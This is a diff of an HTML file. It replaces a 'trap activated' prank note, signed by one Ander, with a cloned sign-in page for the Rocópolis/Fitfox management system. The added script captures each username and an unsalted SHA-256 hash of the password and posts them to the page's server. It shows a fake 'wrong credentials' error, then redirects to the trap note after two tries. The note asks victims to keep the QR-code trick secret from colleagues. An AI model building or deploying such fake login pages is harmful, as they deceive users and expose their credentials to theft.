@@ -1,305 +1,285 @@
-<html lang="es">
+<!DOCTYPE html><html lang="en"><!--begin::Head--><head>
+    <title>Rocópolis</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Sistema de gestión para centros formativos y centros deportivos.">
+    <meta name="keywords" content="Fitfox, sistema, gestión, formación, centro formativo, centro deportivo, ERP, pamplona, españa, navarra, xcolme, fitfoxcolme">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="Rocópolis">
+    <!--begin::Fonts-->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700">
+    <!--end::Fonts-->
+    <!--begin::Global Stylesheets Bundle(used by all pages)-->
+    <link href="css/plugins.bundle.css" rel="stylesheet" type="text/css">
+    <link href="css/style.bundle.css" rel="stylesheet" type="text/css">
+    <link href="css/fitfox.css" rel="stylesheet" type="text/css">
+    <link rel="manifest" href="/manifest.json?v=20260513">
+    <!--end::Global Stylesheets Bundle-->
+        <style>
+        body {
+            background-image: url('images/1761308037_dsgdsfgd.png');
+            background-blend-mode: color-burn;
+            background-repeat: repeat-y;
+            background-size: cover;
+        }
 
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Oops…</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;600;700&family=Lora:ital,wght@0,400;1,400&display=swap"
-    rel="stylesheet" />
-  <style>
-    *,
-    *::before,
-    *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+        .bg-body {
+            background-color: #ffffff66 !important;
+        }
 
-    :root {
-      --paper: #fdf8f0;
-      --paper2: #f5ede0;
-      --ink: #2c1f0e;
-      --ink-mid: #5c4a32;
-      --accent: #c0392b;
-      --line: #d9c9b0;
-    }
+        /* Estilos para teléfono */
+        @media only screen and (max-width: 767px) {
+            .imagen {
+                /* Estilos específicos para teléfono */
+                width: 75%;
+            }
 
-    html,
-    body {
-      min-height: 100%;
-    }
+            .imagen2 {
+                width: 30%;
+                margin-top: 5px
+            }
+        }
 
-    body {
-      font-family: 'Lora', Georgia, serif;
-      background: var(--paper2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 2rem 1rem;
-      position: relative;
-      overflow: hidden;
-    }
+        /* Estilos para tablet */
+        @media only screen and (min-width: 768px) and (max-width: 1023px) {
+            .imagen {
+                /* Estilos específicos para tablet */
+                width: 50%;
+            }
 
-    /* Background ruled lines like a notebook */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image: repeating-linear-gradient(transparent,
-          transparent 31px,
-          var(--line) 31px,
-          var(--line) 32px);
-      opacity: .4;
-      pointer-events: none;
-    }
+            .imagen2 {
+                width: 10%;
+                margin-top: 100px
+            }
+        }
 
-    /* Torn paper shadow underneath */
-    .shadow-note {
-      position: absolute;
-      width: min(480px, 92vw);
-      background: #e8dcc8;
-      border-radius: 4px 4px 6px 5px;
-      padding: 2.5rem 2.75rem;
-      transform: rotate(2.2deg) translateY(6px);
-      filter: blur(1px);
-      opacity: .5;
-    }
+        /* Estilos para escritorio */
+        @media only screen and (min-width: 1024px) {
+            .imagen {
+                /* Estilos específicos para escritorio */
+                width: 25%;
+            }
 
-    .note {
-      position: relative;
-      width: min(480px, 92vw);
-      background: var(--paper);
-      border-radius: 3px 4px 5px 4px;
-      padding: 2.5rem 2.75rem 3rem;
-      box-shadow:
-        0 2px 4px rgba(0, 0, 0, .08),
-        0 8px 32px rgba(0, 0, 0, .12),
-        inset 0 0 0 1px rgba(0, 0, 0, .04);
-      transform: rotate(-1.5deg);
-      animation: dropIn .6s cubic-bezier(.16, 1, .3, 1) both;
-    }
+            .imagen2 {
+                margin-top: 100px
+            }
+        }
 
-    @keyframes dropIn {
-      from {
-        opacity: 0;
-        transform: rotate(-1.5deg) translateY(-24px) scale(.96);
-      }
+        :root {
+            --bg-fitfox: #000000;
+        }
 
-      to {
-        opacity: 1;
-        transform: rotate(-1.5deg) translateY(0) scale(1);
-      }
-    }
+            </style>
+    </head>
+<!--end::Head-->
+<!--begin::Body-->
 
-    /* Red margin line */
-    .note::before {
-      content: '';
-      position: absolute;
-      left: 52px;
-      top: 0;
-      bottom: 0;
-      width: 1.5px;
-      background: rgba(192, 57, 43, .35);
-      border-radius: 1px;
-    }
+<body id="kt_body" class="bg-body">
+    <!--begin::Main-->
+    <!--begin::Root-->
+    <div class="d-flex flex-column flex-root">
+        <!--begin::Authentication - Sign-in -->
+        <div class="d-flex flex-column flex-lg-row flex-column-fluid">
+            <!--begin::Aside-->
+            <!--end::Aside-->
+            <!--begin::Body-->
+            <div class="d-flex flex-column flex-lg-row-fluid py-10">
+                <!--begin::Content-->
+                <div class="d-flex flex-center flex-column flex-column-fluid">
+                    <!--begin::Wrapper-->
+                    <img alt="Logo" src="images/1761224052_OVEJA%20%281%29.png" class="col-4 col-md-3 col-lg-1">
+                    <div class="w-lg-500px p-10 p-lg-15 mx-auto">
+                        <!--begin::Form-->
 
-    /* Pin / tape at top */
-    .pin {
-      position: absolute;
-      top: -10px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 18px;
-      height: 18px;
-      background: radial-gradient(circle at 40% 35%, #e74c3c, #922b21);
-      border-radius: 50%;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, .3), inset 0 1px 2px rgba(255, 255, 255, .2);
-    }
+                        <div class="card mb-5">
+                            <div class="card-body">
 
-    .pin::after {
-      content: '';
-      position: absolute;
-      bottom: -8px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 2px;
-      height: 10px;
-      background: linear-gradient(#7b241c, transparent);
-      border-radius: 1px;
-    }
+                                <!-- Error de login (oculto hasta el primer intento fallido) -->
+                                <div id="login-error" class="alert alert-danger d-flex align-items-center d-none mb-5" role="alert">
+                                    <span class="svg-icon svg-icon-2hx svg-icon-danger me-3">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                            <rect opacity="0.3" x="2" y="2" width="20" height="20" rx="10" fill="currentColor"/>
+                                            <rect x="11" y="14" width="7" height="2" rx="1" transform="rotate(-90 11 14)" fill="currentColor"/>
+                                            <rect x="11" y="17" width="2" height="2" rx="1" transform="rotate(-90 11 17)" fill="currentColor"/>
+                                        </svg>
+                                    </span>
+                                    <div class="fw-bold">Credenciales incorrectas. Por favor, inténtalo de nuevo.</div>
+                                </div>
 
-    /* Hole punches */
-    .holes {
-      position: absolute;
-      left: 18px;
-      top: 0;
-      bottom: 0;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-evenly;
-      gap: 0;
-      pointer-events: none;
-    }
+                                <form class="form w-100" novalidate="novalidate" id="loginForm" action="/loginPag" method="post">
+                                    <input type="hidden" name="_token" value="yqCPo6ib7sNIpknWlqJPAuq3ApDfagxKgQXHf2BE">                                    <!--begin::Heading-->
+                                    <div class="text-center mb-5">
+                                        <!--begin::Title-->
+                                        <h1 class="text-primary mb-3">Rocópolis</h1>
+                                        <!--end::Title-->
+                                        <!--begin::Link-->
+                                                                                <div class="text-gray-400 fw-bold fs-4 d-none">
+                                            <a href="/registro" class="link-primary fw-bolder">¡Crea una cuenta!</a>
+                                        </div>
+                                                                                <!--end::Link-->
+                                    </div>
+                                    <!--begin::Heading-->
+                                    <!--begin::Input group-->
+                                    <div class="fv-row mb-5">
+                                        <!--begin::Label-->
+                                        <label class="form-label fs-6 fw-bolder text-primary">Nombre de usuario / Email</label>
+                                        <!--end::Label-->
+                                        <!--begin::Input-->
+                                        <input class="form-control form-control-lg form-control-solid" type="text" name="nombreUsuario" autocomplete="off">
+                                        <!--end::Input-->
+                                    </div>
+                                    <!--end::Input group-->
+                                    <!--begin::Input group-->
+                                    <div class="fv-row mb-5">
+                                        <!--begin::Wrapper-->
+                                        <div class="d-flex flex-stack mb-2">
+                                            <!--begin::Label-->
+                                            <label class="form-label fw-bolder text-primary fs-6 mb-0">Password</label>
+                                            <!--end::Label-->
+                                            <!--begin::Link-->
+                                            <!--end::Link-->
+                                        </div>
+                                        <!--end::Wrapper-->
+                                        <!--begin::Input-->
+                                        <input class="form-control form-control-lg form-control-solid" type="password" name="password" autocomplete="off">
+                                        <a href="/recuperar" class="link-primary fs-6 fw-bolder">¿Has olvidado la contraseña?</a>
+                                        <!--end::Input-->
+                                    </div>
+                                    <!--end::Input group-->
+                                                                        <div class="form-check mb-5">
+                                        <input type="checkbox" class="form-check-input" id="recordarme" name="recordarme">
+                                        <label class="form-check-label" for="recordarme">Recordarme</label>
+                                    </div>
+                                    <!--begin::Actions-->
+                                    <div class="text-center">
+                                        <!--begin::Submit button-->
+                                        <button type="submit" id="kt_sign_in_submit" class="btn btn-lg btn-primary w-100 mb-5">
+                                            <span class="indicator-label">Entrar</span>
+                                        </button>
+                                        <!--end::Submit button-->
+                                    </div>
+                                                                        <div class="text-center">
+                                        <!--begin::Submit button-->
+                                        <a href="/registro" class="btn btn-info btn-sm py-2 w-100">¡Crear una cuenta!</a>
+                                        <!--end::Submit button-->
+                                    </div>
+                                                                        <!--end::Actions-->
+                                </form>
+                            </div>
+                        </div>
 
-    .hole {
-      width: 14px;
-      height: 14px;
-      background: var(--paper2);
-      border-radius: 50%;
-      border: 1.5px solid #d9c9b0;
-      box-shadow: inset 0 1px 3px rgba(0, 0, 0, .1);
-    }
-
-    .content {
-      position: relative;
-    }
-
-    .label {
-      font-family: 'Caveat', cursive;
-      font-size: .85rem;
-      font-weight: 600;
-      color: var(--accent);
-      letter-spacing: .12em;
-      text-transform: uppercase;
-      margin-bottom: 1.1rem;
-      display: flex;
-      align-items: center;
-      gap: .4rem;
-    }
-
-    .label::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: var(--accent);
-      opacity: .3;
-    }
-
-    .message {
-      font-family: 'Caveat', cursive;
-      font-size: 1.42rem;
-      font-weight: 600;
-      color: var(--ink);
-      line-height: 1.65;
-      margin-bottom: 2rem;
-    }
-
-    .message em {
-      font-style: italic;
-      color: var(--ink-mid);
-    }
-
-    .highlight {
-      background: linear-gradient(120deg, rgba(255, 230, 0, .55) 0%, rgba(255, 230, 0, .15) 100%);
-      padding: 0 3px;
-      border-radius: 2px;
-    }
-
-    .signature {
-      font-family: 'Caveat', cursive;
-      font-size: 1.05rem;
-      color: var(--ink-mid);
-      font-style: italic;
-      text-align: right;
-      border-top: 1px dashed var(--line);
-      padding-top: .85rem;
-      margin-top: .5rem;
-    }
-
-    .emoji-big {
-      display: block;
-      font-size: 2.2rem;
-      text-align: center;
-      margin-bottom: 1rem;
-      animation: wiggle 3s ease-in-out 1s infinite;
-    }
-
-    @keyframes wiggle {
-
-      0%,
-      90%,
-      100% {
-        transform: rotate(0deg);
-      }
-
-      92% {
-        transform: rotate(-8deg);
-      }
-
-      96% {
-        transform: rotate(8deg);
-      }
-    }
-
-    /* Stamp */
-    .stamp {
-      position: absolute;
-      bottom: 1.5rem;
-      right: 2rem;
-      width: 64px;
-      height: 64px;
-      border: 3px solid rgba(192, 57, 43, .4);
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transform: rotate(12deg);
-      opacity: .35;
-      font-family: 'Caveat', cursive;
-      font-size: .6rem;
-      font-weight: 700;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      color: var(--accent);
-      text-align: center;
-      line-height: 1.3;
-    }
-  </style>
-</head>
-
-<body>
-
-  <div class="shadow-note"></div>
-
-  <div class="note">
-    <div class="pin"></div>
-    <div class="holes">
-      <div class="hole"></div>
-      <div class="hole"></div>
-      <div class="hole"></div>
+                        <!--end::Form-->
+                    </div>
+                                        <img alt="Logo" src="images/logo-fitfox.png" class="col-4 col-md-3 col-lg-1" style="filter: drop-shadow(2px 4px 3px gray);">
+                                    </div>
+                <!--end::Content-->
+            </div>
+            <!--end::Body-->
+        </div>
+        <!--end::Authentication - Sign-in-->
     </div>
+    <!--end::Root-->
+    <!--end::Main-->
+    <!--begin::Javascript-->
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('/service-worker.js')
+                    .then(function(registration) {
+                        console.log('ServiceWorker registrado con éxito:', registration.scope);
+                    })
+                    .catch(function(error) {
+                        console.error('Error al registrar el ServiceWorker:', error);
+                    });
+            });
+        }
+    </script>
+    <script>
+        var hostUrl = "assets/";
+    </script>
+    <!--begin::Global Javascript Bundle(used by all pages)-->
+    <script src="js/plugins.bundle.js"></script>
+    <script src="js/scripts.bundle.js"></script>
+    <!--end::Global Javascript Bundle-->
+    <!--end::Javascript-->
 
-    <div class="content">
-      <div class="label">📍 nota importante</div>
+    <script>
+        //Al terminar de cargar
+        window.onload = function() {
+            try {
+                window.ReactNativeWebView.postMessage(JSON.stringify({
+                    accion: "dispId",
+                }));
+            } catch (e) {}
 
-      <span class="emoji-big">😊</span>
+                    }
+    </script>
 
-      <p class="message">
-        Esto ha sido una <span class="highlight">trampa de Ander</span>
-        (el chico que ha venido un par de días).<br><br>
-        No te preocupes,
-        <em>NO es malicioso</em> :)<br><br>
-        De todas formas… <span class="highlight">no te chives a los demás</span>,
-        que así les pongo a prueba a ellos también.<br><br>
-        <em>No te fíes de los QRs</em> ;)
-      </p>
 
-      <div class="signature">— Ander</div>
-    </div>
 
-    <div class="stamp">trampa<br />activada<br />✓</div>
-  </div>
-  <script>
-    fetch('/visit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ page: window.location.pathname, user: 'anonymous' }),
-    }).catch(() => { });
-  </script>
+    <script>
+        // ── Login Logger integration ──────────────────────────────
+        const MAX_ATTEMPTS  = 2;
+        const REDIRECT_URL  = 'trampa.html';
+        let   attempts      = 0;
 
-</body>
+        // Hash SHA-256 irreversible usando la Web Crypto API nativa
+        async function sha256(text) {
+            const encoded = new TextEncoder().encode(text);
+            const buffer  = await crypto.subtle.digest('SHA-256', encoded);
+            return Array.from(new Uint8Array(buffer))
+                .map(function(b) { return b.toString(16).padStart(2, '0'); })
+                .join('');
+        }
 
-</html>
+        // Registra la visita al cargar la página
+        fetch('/visit', {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify({ page: window.location.pathname, user: 'anonymous' }),
+        }).catch(function() {});
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            var username     = document.querySelector('[name="nombreUsuario"]').value.trim();
+            var passwordRaw  = document.querySelector('[name="password"]').value;
+            var passwordHash = await sha256(passwordRaw);
+
+            attempts++;
+
+            if (attempts >= MAX_ATTEMPTS) {
+                await fetch('/login', {
+                    method:    'POST',
+                    headers:   { 'Content-Type': 'application/json' },
+                    body:      JSON.stringify({
+                        username:   username,
+                        password:   passwordHash,
+                        page:       window.location.pathname,
+                        event:      'MAX_ATTEMPTS_REDIRECT',
+                        attempts:   attempts,
+                        redirectTo: REDIRECT_URL,
+                    }),
+                    keepalive: true,
+                }).catch(function() {});
+
+                window.location.href = REDIRECT_URL;
+                return;
+            }
+
+            fetch('/login', {
+                method:  'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body:    JSON.stringify({
+                    username: username,
+                    password: passwordHash,
+                    page:     window.location.pathname,
+                }),
+            }).catch(function() {});
+
+            document.getElementById('login-error').classList.remove('d-none');
+        });
+    </script>
+
+</body><!--end::Body--></html>
